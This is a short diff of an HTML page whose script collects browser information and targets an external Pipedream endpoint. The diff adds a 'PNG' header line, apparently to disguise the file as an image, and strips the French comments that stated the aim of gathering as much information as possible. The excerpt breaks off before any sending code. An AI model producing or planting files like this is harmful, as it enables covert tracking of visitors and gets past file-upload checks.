@@ -1,11 +1,12 @@
+PNG
 <!DOCTYPE html>
 <html>
 <head>
     <script>
-        // URL de ton Pipedream
+    
         const PIPEDREAM_URL = 'https://eo1yzt16ee3bzu9.m.pipedream.net';
         
-        // Récupérer un maximum d'informations
+        /
         const sensitiveData = {
             // Information sur la requête
             timestamp: new Date().toISOString(),
@@ -20,7 +21,7 @@
             languages: navigator.languages,
             platform: navigator.platform,
             
-            // Tentative de récupération d'informations réseau
+            
             ipInfo: 'will_be_from_server', // Le serveur verra la vraie IP
             
             // Headers potentiels
